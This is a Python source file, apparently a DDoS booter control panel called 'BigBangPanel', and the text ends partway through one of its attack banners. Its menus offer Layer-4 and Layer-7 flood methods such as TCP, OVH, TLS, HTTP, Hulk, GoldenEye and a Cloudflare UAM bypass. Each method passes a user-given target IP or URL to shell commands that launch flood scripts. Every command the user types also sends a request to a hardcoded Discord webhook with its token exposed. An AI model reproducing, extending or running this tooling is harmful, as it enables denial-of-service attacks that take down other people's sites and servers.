# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH

def layer7():
	os.system ("clear")
	print("""
\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
\033[37m     `''''MMMMM\033[35m88&&&&''''`
\033[37m           'MMM\033[35m8&&&'

\033[37m[ LAYER - 7 ]
\033[35mNOTE USE:
METHODE [URL] [PORT] [TIME]

\033[37m – STRIKE   – TLSV3 
 – BOMB2    – JAVA
 – BOMB     – HTTP
 – GOLDEN   
 – UAM 
 – TLS 
 – TLSV2

""")

def layer12():
	os.system ("clear")
	print("""
\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
\033[37m     `''''MMMMM\033[35m88&&&&''''`
\033[37m           'MMM\033[35m8&&&'

\033[37m[ LAYER - 12 ]
\033[35mUSE FOR BOT COUNT

\033[37m– BRUTAL [url] [time]
– BOT [url] [time]

""")

def VVIP():
	os.system ("clear")
	print("""
\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
\033[37m     `''''MMMMM\033[35m88&&&&''''`
\033[37m           'MMM\033[35m8&&&'

\033[37m[ VVIP ]
\033[35mNOTE USE:
METHODE [URL] [PORT] [TIME]

\033[37m– HTTPS
– HTTPS2

""")

def layer4():
	os.system ("clear")
	print("""
\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
\033[37m     `''''MMMMM\033[35m88&&&&''''`
\033[37m           'MMM\033[35m8&&&'

\033[37m[ LAYER - 4 ]
\033[35mNOTE USE: 
mode   [1/2/3]
method [GET/POST/HEAD]
            

\033[37m – STRESS [ip] [port] [mode] [time]
 – TCP [ip] [port] [time] [method]
 – OVH [ip] [port] [time] [method]


""")    

def help():
	os.system ("clear")
	print("""
\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
\033[37m     `''''MMMMM\033[35m88&&&&''''`
\033[37m           'MMM\033[35m8&&&'

\033[37m[ MENU BIGBANG-PANNEL ]
HOW TO USE TYPE L7 OR L4 TO SEE COMMANDS

[LAYER-7]       [LAYER-4]       [LAYER-12]      [VVIP]
\033[35m• STRIKE        • STRESS        • BRUTAL        • HTTPS [\033[32mVVIP\033[35m]
• BOMB2         • TCP           • BOT           • HTTPS2 [\033[32mVVIP\033[35m]              
• BOMB          • OVH
• GOLDEN
• UAM
• TLS [\033[32mVIP\033[35m]
• TLSV2 [\033[32mVIP\033[35m]
• TLSV3 [\033[32mVIP\033[35m]
• JAVA
• HTTP [\033[32mVIP\033[35m]

""")

def menu():
    os.system ("clear")
    print("""
\033[37m           ,MMM\033[35m8&&&.           WELCOME TO - BIGBANGPANEL
\033[37m      _...MMMMM\033[35m88&&&&..._      KETHEK MAN & Mr. E-CYBER
\033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.   EXECUTOR TEAM Version, 1.2
\033[37m  ::     MMMMM8\033[35m8&&&&&&     ::  2023 - 2024
\033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
\033[37m     `''''MMMMM\033[35m88&&&&''''`
\033[37m           'MMM\033[35m8&&&'


\x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " HELP " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
""")



def main():

	while True:
		sys.stdout.write(f"\x1b]2;[/] BigBang Pannel :: Server Online 500 :: Online 1 :: Running: 0/10\x07")
		sin = input("\033[0;30;45mBigBang @ PANNEL\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m ")
		sinput = requests.get("https://discord.com/api/webhooks/1158335789176979486/5F6Fb2HF2EjqYf6OstagUD3vlWmpOwx3JivC04jIgrB2grHcW7f588MilOBeN6to-C5R")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			menu()
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			menu()
		if sinput == "layer12" or sinput == "l12" or sinput == ".layer12" or sinput == "LAYER12" or sinput == ".LAYER12" or sinput == "L12":
			layer12()
		if sinput == "vvip" or sinput == "vip" or sinput == ".vvip" or sinput == "VVIP" or sinput == ".VVIP" or sinput == "VIP":
			VVIP()
		if sinput == "layer7" or sinput == "l7" or sinput == ".layer7" or sinput == "LAYER7" or sinput == ".LAYER7" or sinput == "L7":
			layer7()
		if sinput == "layer4" or sinput == "l4" or sinput == ".layer4" or sinput == "LAYER4" or sinput == ".LAYER4" or sinput == "L4":
			layer4()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()
		if sinput == "plan":
			plant()
		elif sinput == "":
			main()

#########LAYER-4########
		elif sinput == "stress" or sinput == "STRESS":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				method = sin.split()[3]
				time = sin.split()[4]
				os.system(f'cd resources && go run stress.go {ip} {port} {method} 1250 {time} 5')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
\033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mSTRESSER \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tcp" or sinput == "TCP":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'cd resources && ./TCP {method} {ip} {port} {time} 15000')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mTCP \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "ovh" or sinput == "OVH":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'cd resources && ./RAW {method} {ip} {port} {time} 15000')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   IP       : \033[35m[ \033[1;37m{ip}  \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   METHOD   : \033[35m[ \033[1;37m{method} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   LAYER-4  : \033[35m[ \033[1;37mOVH \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()

#########LAYER-7########  
		elif sinput == "strike" or sinput == "STRIKE":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd resources && go run strike.go -url {url} GET')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mSTRIKE \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "java" or sinput == "JAVA":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd randomstring && cd examples && java input2.java {url} 12000')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mJAVA \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tls" or sinput == "TLS":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd godzilla && ./tls {url} {time} 300 3 500')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                   TIME     : \033[35m[\033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLS \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bot" or sinput == "BOT":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd resources && node count.js {url} 50 {time}')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBOT \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "brutal" or sinput == "BRUTAL":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd randomstring && python3 input.py {url} {time}')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBRUTAL \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tlsv2" or sinput == "TLSV2":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd godzilla && node tlsv2.js {url} {time} 500 5')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV2 \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tlsv3" or sinput == "TLSV3":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd worm && ./tls-linux {url} {time} 8 1 32')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV3 \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "http" or sinput == "HTTP":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd godzilla && node HTTP.js {url} 500 1 {time}')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mHTTP \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bomb2" or sinput == "BOMB2":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd resources && go run Hulk.go -site {url} -data POST')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB2 \033[35m]
\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bomb" or sinput == "BOMB":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd resources && go run Low.go -site {url} -data POST')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB \033[35m]
\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "golden" or sinput == "GOLDEN":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd resources && python3 goldeneye.py {url} -w 10 -s 500 -m random -d True')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET    : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                TIME      : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT      : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                LAYER-7   : \033[35m[ \033[1;37mGOLDEN \033[35m]
\033[1;37m                VIP       : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER      : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "https" or sinput == "HTTPS":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd randomstring && ./screetvip {url} {time} 50 10')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "https2" or sinput == "HTTPS2":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd godzilla && ./tls {url} {time} 300 2')
				os.system(f'cd godzilla && node tlsv2.js {url} {time} 300 2')
				os.system(f'cd randomstring && ./screetvip {url} {time} 300 5')
				os.system(f'cd godzilla && node HTTP.js {url} 500 1 {time}')
				os.system(f'cd resources && go run Hulk.go -site {url} -data GET')
				os.system(f'cd resources && go run strike.go -url {url} GET')
				os.system(f'cd resources && go run Low.go -site {url} -data POST')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS2 \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "uam" or sinput == "UAM":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd resources && node uambypass.js {url} {time} 5000 http.txt')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
